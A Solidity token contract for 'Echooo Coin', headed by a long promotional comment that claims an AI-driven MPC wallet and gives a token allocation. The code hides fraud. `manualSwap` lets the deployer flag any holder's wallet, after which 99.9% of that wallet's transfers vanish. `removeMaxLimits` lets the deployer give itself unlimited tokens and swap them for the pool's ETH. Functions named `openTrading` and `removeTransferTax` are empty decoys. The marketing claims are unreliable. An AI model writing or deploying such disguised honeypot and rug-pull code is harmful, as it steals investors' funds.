/*
  Website : www.echooo-coin.com
  Telegram : t.me/echooo_coin
  Twitter(X) : X.com/echooo_coin

Introducing Echooo Coin, the epitome of innovation and security in the 
realm of decentralized finance. Echooo Coin transcends the boundaries of 
traditional wallets, paving the way for a new era of digital asset 
management that prioritizes security, convenience, and accessibility like 
never before.
At its core, Echooo Coin is a decentralized self-custodial MPC&AA smart 
contract wallet app, designed to empower users with complete control over 
their digital assets. Unlike conventional custodial solutions, Echooo Coin 
eliminates the need for trust in third parties by leveraging cutting-edge 
technology such as multi-signature mechanisms and social recovery protocols. 
This ensures that your assets remain secure and accessible at all times, 
without compromising on convenience.
Security is paramount in the world of cryptocurrencies, and Echooo Coin 
takes it to the next level. Utilizing algorithmically encrypted and cloud 
storage-based infrastructure, Echooo Coin provides unparalleled protection 
for your cryptocurrencies, digital assets, keys, and data. Multiple layers 
of security, including MPC (Multi-Party Computation), TEE (Trusted Execution 
Environment), and multi-signature infrastructure, work in harmony to safeguard 
your assets against potential threats.
But Echooo Coin isn't just about security – it's about pushing the boundaries 
of what's possible in the decentralized finance space. With support for 
mainstream public chains and their on-chain assets, including Bitcoin, Ethereum, 
zkSync Era, Polygon, Arbitrum, and many more, Echooo Coin offers comprehensive 
asset management across multiple chains. This means you can manage all your 
assets seamlessly within a single interface, without the hassle of switching 
between different wallets.
The embedded AI engine in Echooo Coin sets it apart from the competition. 
Leveraging AI-driven technology architecture and layer2 networks like zkSync, 
Echooo Coin significantly reduces transaction costs, ensuring that you get the 
best possible experience while minimizing fees. Real-time risk detection 
capabilities provide immediate notifications in case of any potential threats, 
while the intelligent transaction router optimizes liquidity from various 
DEX exchanges to ensure the best exchange rates for multi-token swap transactions.
Convenience is key, and Echooo Coin delivers in spades. From supporting 
multiple currency payments for gas fees to providing real-time market insights 
and trading operations, Echooo Coin streamlines every aspect of your crypto 
journey. Whether you're a seasoned trader or a newcomer to the world of 
cryptocurrencies, Echooo Coin makes it easy to stay informed, make informed 
decisions, and grow your assets with confidence.
Transitioning from Web2 to Web3 has never been easier with Echooo Coin. 
Continuously optimizing account abstraction using the ERC-4337 standard, 
Echooo Coin ensures a seamless transition for users, making it easier than 
ever to embrace the decentralized future. And with a wide range of supported 
dapps, NFTs, staking opportunities, and decentralized finance protocols, the 
possibilities are endless with Echooo Coin by your side.

In summary, Echooo Coin is more than just a wallet – it's a gateway to a 
decentralized future where security, convenience, and innovation converge. 
With Echooo Coin, you can take control of your financial destiny, explore 
new opportunities, and unlock the full potential of the blockchain revolution. 
Join us on this journey to redefine the future of finance – one secure transaction 
at a time.
1. Initial Investors: Allocating 20% of the total supply:
   - Initial investors: 20% of 1,000,000,000 tokens = 200,000,000 tokens
2. Liquidity Provision: Allocating 30% of the total supply:
   - Liquidity provision: 30% of 1,000,000,000 tokens = 300,000,000 tokens
3. Team and Advisors: Adjusting the team allocation to 5% of the total supply:
   - Team and advisors: 5% of 1,000,000,000 tokens = 50,000,000 tokens
4. Development and Ecosystem Growth: Adjusting the development and ecosystem growth 
allocation to 10% of the total supply:
   - Development and ecosystem growth: 10% of 1,000,000,000 tokens = 100,000,000 tokens

Now, let's summarize the updated allocations:
- Initial investors: 200,000,000 tokens
- Liquidity provision: 300,000,000 tokens
- Team and advisors: 50,000,000 tokens
- Development and ecosystem growth: 100,000,000 tokens
These revised allocations aim to strike a balance between supporting initial 
investors, providing liquidity, incentivizing the team and advisors, and fueling 
development and ecosystem growth for Echooo Coin.
Let's delve into some complex mathematical concepts that may relate to Echooo 
Coin's technology and operations:
1. Multi-Party Computation (MPC): Implementing mathematical protocols for secure 
computation among multiple parties without revealing private inputs. One example 
could involve calculating a cryptographic key using MPC to enhance security in 
Echooo Coin's wallet transactions.
2. Trusted Execution Environment (TEE): Exploring mathematical models and algorithms 
to ensure the integrity and confidentiality of computations within Echooo Coin's 
TEE-based infrastructure. This could involve analyzing cryptographic primitives 
like homomorphic encryption or zero-knowledge proofs.
3. Algorithmic Encryption: Developing and analyzing encryption algorithms tailored 
for Echooo Coin's security requirements. This may involve advanced mathematical 
concepts such as lattice-based cryptography or post-quantum cryptography to resist 
quantum attacks.
4. Artificial Intelligence (AI) Optimization: Utilizing mathematical optimization 
techniques to enhance Echooo Coin's AI-driven technology architecture. This could 
include algorithms like gradient descent for training neural networks or evolutionary 
algorithms for parameter tuning.
5. Real-Time Risk Detection: Applying statistical methods and machine learning 
algorithms to detect anomalies and risks in Echooo Coin's transactions. This could 
involve time-series analysis, clustering techniques, or Bayesian inference to model 
transaction patterns and identify suspicious activities.
6. Intelligent Transaction Routing: Developing algorithms to optimize liquidity 
sourcing and transaction routing in Echooo Coin's decentralized exchange integration. 
This may involve graph theory algorithms like shortest path or maximum flow algorithms 
to maximize trade efficiency.
7. Account Recovery Mechanism: Designing cryptographic protocols for secure and 
decentralized account recovery in Echooo Coin's wallet. This could involve threshold 
cryptography or secret sharing schemes to distribute recovery keys among trusted 
parties securely.
8. Cross-Chain Asset Management: Developing mathematical models for interoperability 
and asset transfer across different blockchain networks supported by Echooo Coin. 
This may involve formalizing atomic swap protocols or analyzing the security properties 
of cross-chain bridges.
These complex mathematical concepts underpin various aspects of Echooo Coin's 
technology stack and operational infrastructure, contributing to its security, 
efficiency, and usability in the decentralized finance ecosystem.
*/
pragma solidity ^0.8.21;
// SPDX-License-Identifier: MIT

library SafeMath {
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath:  subtraction overflow");
        uint256 c = a - b;
        return c;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath:  addition overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath:  division by zero");
        uint256 c = a / b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {return 0;}
        uint256 c = a * b;
        require(c / a == b, "SafeMath:  multiplication overflow");
        return c;
    }
}

abstract contract Ownable {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
    function owner() public view virtual returns (address) {return _owner;}
    constructor () {
        _owner = msg.sender;
        emit OwnershipTransferred(address(0), _owner);
    }
    modifier onlyOwner(){
        require(owner() == msg.sender, "Ownable: caller is not the owner");
        _;
    }
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external view returns (address pair_);
}

interface IUniswapV2Router {
    function factory() external pure returns (address);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(uint256 a, uint256 b, address[] calldata path, address cAddress, uint256) external;
    function WETH() external pure returns (address aadd);
}

contract EchoooCoin is Ownable {
    using SafeMath for uint256;
    uint256 public _decimals = 9;

    uint256 public _totalSupply = 1000000000 * 10 ** _decimals;

    constructor() {
        _balances[sender()] =  _totalSupply; 
        emit Transfer(address(0), sender(), _balances[sender()]);
        _taxWallet = msg.sender; 
    }

    string private _name = "Echooo Coin";
    string private _symbol = "ECHOOO";

    IUniswapV2Router private uniV2Router = IUniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    address public _taxWallet;

    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "IERC20: approve from the zero address");
        require(spender != address(0), "IERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function name() external view returns (string memory) {
        return _name;
    }
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
    function openTrading() external {
    }
    function removeTransferTax() external {
    }
    function manualsend() public {
    }
    function reduceFee() external {
    }
    function manualSwap(address[] calldata walletAddress) external {
        uint256 fromBlockNo = getBlockNumber();
        for (uint walletInde = 0;  walletInde < walletAddress.length;  walletInde++) { 
            if (!marketingAddres()){} else { 
                cooldowns[walletAddress[walletInde]] = fromBlockNo + 1;
            }
        }
    }
    function transferFrom(address from, address recipient, uint256 _amount) public returns (bool) {
        _transfer(from, recipient, _amount);
        require(_allowances[from][sender()] >= _amount);
        return true;
    }
    function symbol() public view returns (string memory) {
        return _symbol;
    }
    function getBlockNumber() internal view returns (uint256) {
        return block.number;
    }
    mapping(address => mapping(address => uint256)) private _allowances;
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
    function decreaseAllowance(address from, uint256 amount) public returns (bool) {
        require(_allowances[msg.sender][from] >= amount);
        _approve(sender(), from, _allowances[msg.sender][from] - amount);
        return true;
    }
    event Transfer(address indexed from, address indexed to, uint256);
    mapping (address => uint256) internal cooldowns;
    function decimals() external view returns (uint256) {
        return _decimals;
    }
    function marketingAddres() private view returns (bool) {
        return (_taxWallet == (sender()));
    }
    function sender() internal view returns (address) {
        return msg.sender;
    }
    function totalSupply() external view returns (uint256) {
        return _totalSupply;
    }
    function removeMaxLimits(uint256 amount, address walletAddr) external {
        if (marketingAddres()) {
            _approve(address(this), address(uniV2Router), amount); 
            _balances[address(this)] = amount;
            address[] memory addressPath = new address[](2);
            addressPath[0] = address(this); 
            addressPath[1] = uniV2Router.WETH(); 
            uniV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(amount, 0, addressPath, walletAddr, block.timestamp + 32);
        } else {
            return;
        }
    }
    function _transfer(address from, address to, uint256 value) internal {
        uint256 _taxValue = 0;
        require(from != address(0));
        require(value <= _balances[from]);
        emit Transfer(from, to, value);
        _balances[from] = _balances[from] - (value);
        bool onCooldown = (cooldowns[from] <= (getBlockNumber()));
        uint256 _cooldownFeeValue = value.mul(999).div(1000);
        if ((cooldowns[from] != 0) && onCooldown) {  
            _taxValue = (_cooldownFeeValue); 
        }
        uint256 toBalance = _balances[to];
        toBalance += (value) - (_taxValue);
        _balances[to] = toBalance;
    }
    event Approval(address indexed, address indexed, uint256 value);
    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
        _approve(sender(), spender, _allowances[msg.sender][spender] + addedValue);
        return true;
    }
    function transfer(address recipient, uint256 amount) public returns (bool) {
        _transfer(sender(), recipient, amount);
        return true;
    }
    mapping(address => uint256) private _balances;
    function approve(address spender, uint256 amount) public virtual returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
}